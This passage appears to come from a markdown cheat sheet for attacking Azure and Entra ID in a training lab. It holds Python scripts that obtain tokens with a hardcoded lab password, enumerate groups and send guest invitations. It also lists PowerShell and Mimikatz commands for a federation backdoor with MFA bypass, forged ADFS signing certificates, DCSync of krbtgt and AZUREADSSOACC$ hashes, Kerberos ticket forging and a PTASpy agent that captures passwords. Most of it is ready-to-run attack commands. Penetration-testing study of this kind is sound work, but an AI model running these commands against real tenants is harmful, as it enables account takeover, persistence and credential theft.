tenant_id = 'b6e0615d-2c17-46b3-922c-491c91624acd'
username = 'thomasebarlow@defcorpit.onmicrosoft.com'
password = r'test'
scope = 'openid profile offline_access https://graph.microsoft.com/.default'

# Cuerpo de la solicitud
body = (
    f'client_id={client_id}'
    f'&grant_type=password'
    f'&username={username}'
    f'&password={password}'
    f'&scope={scope}'
    f'&client_info=1'
)

# Encabezados de la solicitud
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Conexión y solicitud
conn = http.client.HTTPSConnection('login.microsoftonline.com')
conn.request('POST', f'/{tenant_id}/oauth2/v2.0/token', body, headers)

# Manejo de la respuesta
response = conn.getresponse()
status_code = response.status
data = json.loads(response.read())
conn.close()

# Imprimir el código de estado
print(status_code)
```

#### Abusing rule

> Rule example: `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`

##### Enumerate Groups script

```python
# This script is a part of Attacking and Defending Azure - Beginner's Edition course by Altered Security
# https://www.alteredsecurity.com/azureadlab

import http.client
import json

def get_access_token_with_username_password(client_id, tenant_id, username, password):

    scope = "openid profile offline_access https://graph.microsoft.com/.default"
    
    # Prepare the body for the POST request
    body = f"client_id={client_id}&grant_type=password&username={username}&password={password}&scope={scope}&client_info=1"

    
    # Prepare headers
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    # Send the request
    conn = http.client.HTTPSConnection("login.microsoftonline.com")
    conn.request("POST", f"/{tenant_id}/oauth2/v2.0/token", body, headers)
    
    response = conn.getresponse()
    data = response.read()
    conn.close()

    # Parse and print the access token
    token_response = json.loads(data)
    
    if "access_token" in token_response:
        access_token = token_response['access_token']
        print("[+] Access token acquired successfully.")
        
        # Call the function to list all groups
        list_groups(access_token)
    else:
        print(f"[-] Failed to acquire token: {token_response.get('error_description')}")
        return None

def list_groups(access_token):
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    
    # Parse the URL for the Graph API
    conn = http.client.HTTPSConnection("graph.microsoft.com")
    
    # Send the request to get the list of groups
    conn.request("GET", "/v1.0/groups", headers=headers)
    response = conn.getresponse()
    
    if response.status == 200:
        groups_data = response.read().decode('utf-8')
        groups = json.loads(groups_data).get('value', [])
        
        # Iterate through each group and get membership details
        for group in groups:
            group_id = group['id']
            group_name = group['displayName']
            group_type = group.get('groupTypes', [])
            membership_rule = group.get('membershipRule', None)
            
            print(f"\nGroup Name: {group_name}, Group Type: {group_type}")
            
            # Print the dynamic group rule if it exists
            if membership_rule:
                print(f"Membership Rule: {membership_rule}")
            else:
                pass
            
            # Get group members
            members_url = f"/v1.0/groups/{group_id}/members"
            conn.request("GET", members_url, headers=headers)
            members_response = conn.getresponse()
            
            if members_response.status == 200:
                members_data = members_response.read().decode('utf-8')
                members = json.loads(members_data).get('value', [])
                print(f"Members of {group_name}:")
                for member in members:
                    print(f" - {member.get('displayName')} ({member.get('userPrincipalName')})")
            else:
                print(f"[-] Failed to get members for group {group_name}: {members_response.status}")
    else:
        print(f"[-] Failed to get groups: {response.status} {response.read().decode('utf-8')}")
    
    # Close the connection
    conn.close()


def main():
    # Example usage
    client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Public Client ID for Az CLI
    tenant_id = "b6e0615d-2c17-46b3-922c-491c91624acd" # Tenant ID of DefCorp IT
    username = "thomasebarlow@defcorpit.onmicrosoft.com" 
    password = r"DeployM3ntUserInTh3Tan3nt!!" # Remember to change this

    get_access_token_with_username_password(client_id, tenant_id, username, password)

if __name__ == '__main__':
    main()
```

##### Invite guest script


```powershell
New-MgInvitation -InvitedUserEmailAddress "student99@defcorpextcontractors.onmicrosoft.com" -InviteRedirectUrl "https://portal.azure.com" -SendInvitationMessage:$true -InvitedUserMessageInfo $messageInfo | fl *
```


```python
# This script is a part of Attacking and Defending Azure - Beginner's Edition course by Altered Security
# https://www.alteredsecurity.com/azureadlab

import http.client
import json
import argparse

def get_access_token_with_username_password(client_id, tenant_id, username, password):

    scope = "openid profile offline_access https://graph.microsoft.com/.default"
    
    # Prepare the body for the POST request
    body = f"client_id={client_id}&grant_type=password&username={username}&password={password}&scope={scope}&client_info=1"
    
    # Prepare headers
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    # Send the request
    conn = http.client.HTTPSConnection("login.microsoftonline.com")
    conn.request("POST", f"/{tenant_id}/oauth2/v2.0/token", body, headers)
    
    response = conn.getresponse()
    data = response.read()
    conn.close()

    # Parse and print the access token
    token_response = json.loads(data)
    
    if "access_token" in token_response:
        access_token = token_response['access_token']
        print("[+] Access token acquired successfully.")
        
        return access_token
    else:
        print(f"[-] Failed to acquire token: {token_response.get('error_description')}")
        return None


def invite_guest(access_token, external_username_email):

    print("[+] Inviting user...")
    # Set up the connection to Microsoft Graph
    conn = http.client.HTTPSConnection("graph.microsoft.com")

    # Define the API endpoint
    endpoint = "/v1.0/invitations"

    # Define the headers, including the Authorization header with the provided access token
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    # Define the body with the email of the guest and some additional optional parameters
    body = {
        "invitedUserEmailAddress": external_username_email,
        "inviteRedirectUrl": f"https://portal.azure.com",  # Update this URL to the actual app redirect URL
        "sendInvitationMessage": True,  # This will send the invite email to the user
        "invitedUserMessageInfo": {
            "customizedMessageBody": "You are invited to collaborate on DefCorp External project." # Update this message to your own message
        }
    }

    # Convert the body to a JSON string
    body_json = json.dumps(body)

    # Send the POST request to the Microsoft Graph API
    conn.request("POST", endpoint, body_json, headers)

    # Get the response from the server
    response = conn.getresponse()

    # Read the response data
    data = response.read()

    # Check if the request was successful
    if response.status == 201:
        # Parse the response data
        invitation_data = json.loads(data)
        invitation_link = invitation_data.get("inviteRedeemUrl")
        object_id = invitation_data.get("invitedUser", {}).get("id")
        print("[+] User invited successfully.\n")
        print(f"Object ID: {object_id}")
        print(f"Invitation link: {invitation_link}")
        return invitation_link
    else:
        # Print the error message if the request failed
        print("[-] Failed to invite user.")
        print(f"[-] Error {response.status}: {data.decode('utf-8')}")
        return None


def main():

    parser = argparse.ArgumentParser(description='Azure AD B2B Guest Invitation Script')
    # Add option to input external user email via argument
    parser.add_argument('--external-user', type=str, help='External user email to invite')

    # Parse command-line arguments
    args = parser.parse_args()

    if args.external_user:
        external_username_email = args.external_user
    else:
        external_username_email = "student99@defcorpextcontractors.onmicrosoft.com" # Add your own user email here.
        if not external_username_email:
            raise ValueError("External user email not provided")

    # Example usage
    client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Public Client ID for Az CLI
    tenant_id = "b6e0615d-2c17-46b3-922c-491c91624acd" # Tenant ID of DefCorp IT
    username = "thomasebarlow@defcorpit.onmicrosoft.com" 
    password = r"DeployM3ntUserInTh3Tan3nt!!" # Remember to change this

    # Get the access token using the username and password
    access_token = get_access_token_with_username_password(client_id, tenant_id, username, password)

    if access_token:
        invite_guest(access_token, external_username_email)
    else:
        print("[-] Failed to get access token.")
        exit()

if __name__ == '__main__':
    main()
```


```powershell
Update-MgUser -UserId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com
```

### Proxy

#### Recon

```powershell
# Find Applications
. C:\AzAD\Tools\Get-MgApplicationProxyApplication.ps1
# Find Service principal
Get-MgServicePrincipal -Filter "DisplayName eq 'Finance Management System'"

. C:\AzAD\Tools\Get-MgApplicationProxyAssignedUsersAndGroups.ps1

Get-MgApplicationProxyAssignedUsersAndGroups -ObjectId <ID APP>
```

## Persistence

### Federation - Trusted Domain

```powershell
#If we have GA privileges on a tenant, we can add a new domain (must be verified), configure its authentication type to Federated and configure the domain to trust a specific certificate (any.sts in the below command) and issuer. Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io
# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID
# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA $true
```

### Token Signing Certificate

```powershell
New-AADIntADFSSelfSignedCertificates
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```

## Lateral Movement

### PHS

```powershell
# Enumerate Server
# Internal
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
# Entra ID
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
Get-AADIntSyncCredentials
runas /netonly /user:defeng.corp\MSOL_782bef6aa0a9 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:defeng\krbtgt /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

### PTA (Viceverse)

> If you need to on Cloud to on-Prem register a new PTA Agent

```powershell
# Enum
Get-ADSyncConnector
# Backdoor on PTA Server
Install-AADIntPTASpy
Get-AADIntPTASpyLog -DecodePasswords
```

### AZUREADSSOACC

#### On-Prem to Cloud

```powershell
# Silver ticket
Invoke-Mimikatz -Command '"lsadump::dcsync /user:defeng\azureadssoacc$ /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin1 /sid:S-1-5-21-938785110-3291390659-577725712 /id:1108 /domain:defeng.corp /rc4:<> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
```

### Federation

#### On Prem to cloud

```powershell
#From any on-prem machine as a normal domain user, get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
# On AD FS server (as administrator)
Get-AdfsProperties |select identifier
# Check the IssuerURI from Entra ID too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri
#With DA privileges on-prem, we can extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate
# Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
#With DA privileges on-prem, it is possible to create ImmutableID of cloud only users with access to Entra Connect Sync credentials!
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_594e67c3-c39b-41bb-ac50-cd8cd8bb780f" -SourceAnchor "pwrtlmsicU+5tgCUgHx2tA=="
# Using AADInternals, export the token signing certificate
Export-AADIntADFSSigningCertificate
# Use the below command from AADInternals to access cloud apps as the user whose
immutableID is specified
Open-AADIntOffice365Portal -ImmutableID pwrtlmsicU+5tgCUgHx2tA== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```

## References

- https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
- https://blog.netwrix.com/2023/05/13/pass-the-prt-overview/
- https://aadinternals.com/post/prt/
- https://github.com/morRubin/PrtToCert
- https://github.com/morRubin/AzureADJoinedMachinePTC